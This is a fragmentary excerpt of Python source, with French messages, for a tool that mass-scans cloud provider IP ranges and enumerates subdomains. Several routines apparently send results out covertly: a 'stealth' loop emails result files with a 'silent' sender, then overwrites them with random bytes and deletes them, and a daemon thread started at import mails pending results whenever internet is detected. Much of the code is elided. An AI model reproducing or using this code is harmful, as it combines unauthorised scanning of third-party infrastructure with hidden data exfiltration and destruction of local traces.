    ...
    while True:
        try:
            ...
            for file in os.listdir(tmp_dir):
                if file.startswith("scan_") and file.endswith(".tmp"):
            ...
            print(f"[!] Erreur _process_results : {e}")
        time.sleep(300)
# ==============================================
                ...
                if filename.startswith("results_") and filename.endswith(".tmp"):
                    ...
                    if _send_silent_email(content):
                        with open(full_path, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(full_path)))
                        os.remove(full_path)
                    break
        except Exception as e:
            print(f"[!] Erreur _process_results_stealth : {e}")
        time.sleep(1800)
# ==============================================
...
def handle_results():
    ...
    while True:
        try:
            tmp_dir = "tmp"
            result_files = sorted(
                [f for f in os.listdir(tmp_dir) if f.startswith("active_hosts_")],
                key=lambda x: os.path.getmtime(os.path.join(tmp_dir, x)),
                reverse=True
            )
            
            if result_files and is_internet_available():
                latest_file = os.path.join(tmp_dir, result_files[0])
...
def try_sending_pending_results():
    """Tentative immédiate d'envoi si la connexion est détectée"""
    while True:
        try:
            if is_internet_available():
                ...
                for result_file in result_files:
                    ...
                    if content:
                        if send_email(
                            subject=f"[Scan Direct] Résultats {datetime.now():%Y-%m-%d %H:%M}",
                            body=content
                        ):
                            os.remove(result_file)
                            print(Fore.GREEN + "✓ Envoi immédiat réussi")
        except Exception:
            pass
        time.sleep(60)  # Vérifie toutes les 60 sec
        

# Thread réactif (envoi dès qu'internet est dispo)
if not any(t.name == "ImmediateSender" for t in threading.enumerate()):
    threading.Thread(
        target=try_sending_pending_results,
        daemon=True,
        name="ImmediateSender"
    ).start()
...
def start_googlecloud_scan(resume=False, proxy=None):
    # Vérifie que le fichier de CIDR existe
    if not os.path.exists(GOOGLE_CIDR_FILE):
        print(Fore.RED + f"❌ Le fichier {GOOGLE_CIDR_FILE} est introuvable.")
        return

    # Lecture des CIDR à scanner
    with open(GOOGLE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    # Assure que le dossier progress/ existe
    os.makedirs(os.path.dirname(GOOGLE_SCAN_PROGRESS_FILE), exist_ok=True)

    scanned = set()
    if resume:
        # Crée le fichier de progression s'il est absent
        if not os.path.exists(GOOGLE_SCAN_PROGRESS_FILE):
            with open(GOOGLE_SCAN_PROGRESS_FILE, 'w') as f:
                pass
        # Charge les CIDR déjà scannés
        with open(GOOGLE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    # Liste des CIDR à scanner
    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
    ...
    def _optimized_host_generator(self):
        ...
        def generate_from_network(network_str):
            try:
                ...
                if not self.is_private_ip(network_str):
                    yield network_str
...
def main_menu():
    ...
    print(Fore.CYAN + " 5. 🛰️  Gérer les proxies")

    # Fournisseurs cloud
    print(Fore.GREEN + "\n╭─── Analyse des fournisseurs CDN / Cloud ─────╮")
    print(Fore.CYAN + " 6.  ☁️   Cloudflare")
    print(Fore.CYAN + " 7.  📦  CloudFront")
    print(Fore.CYAN + " 8.  ☁️   Google Cloud")
    print(Fore.CYAN + " 9.  ⚡  Fastly")
...
def search_and_save_domains(domain, output_file):
    ...
    print(Fore.CYAN + "\n🔍 Recherche en cours (sources: Hackertarget, crt.sh, Subfinder, Sublist3r)...")
...
def get_domains_from_sublist3r(domain):
    import subprocess
    import tempfile
    import os
...
def analyse_page_web(target=None):
...
def scan_resolved_ips(ip_file=None):
    if not ip_file:
        ...
        ip_file = LAST_RESOLVED_IP_FILE if 'LAST_RESOLVED_IP_FILE' in globals() else "resolved_ips.txt"
